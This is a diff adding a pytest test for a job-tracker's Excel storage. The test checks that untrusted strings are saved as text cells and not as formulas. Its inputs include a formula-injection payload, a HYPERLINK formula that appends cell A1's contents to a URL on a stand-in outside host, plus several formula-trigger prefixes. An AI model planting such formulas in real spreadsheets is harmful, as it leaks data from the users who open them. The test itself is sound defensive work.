@@ -384,3 +384,18 @@ def test_lock_error_on_load_queues_and_never_resets_tracker(tmp_path: Path, monk
     monkeypatch.undo()
     assert not list(tmp_path.glob("JobTracker.corrupt-*.xlsx"))
     assert tr.get_job("keep") is not None and tr.pending_count() == 1
+
+
+@pytest.mark.parametrize("evil", ['=HYPERLINK("http://x.example/?"&A1,"click")', "+1+1", "-2+3", "@SUM(A1:A2)"])
+def test_untrusted_strings_are_stored_as_text_never_formulas(tmp_path: Path, evil: str):
+    p = tmp_path / "JobTracker.xlsx"
+    tr = Tracker(path=p)
+    tr.upsert_job({"job_id": "f1", "company": evil, "role": evil, "location": evil})
+    tr.add_action_item(evil, company=evil, id="a1")
+    tr.add_contact(company=evil, name=evil)
+    tr.log("f1", "scout", evil)
+    wb = load_workbook(p)
+    cells = [c for ws in wb.worksheets for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
+    assert len(cells) >= 7
+    assert all(c.data_type == "s" for c in cells), [(c.coordinate, c.data_type) for c in cells]
+    assert tr.get_job("f1")["Company"] == evil
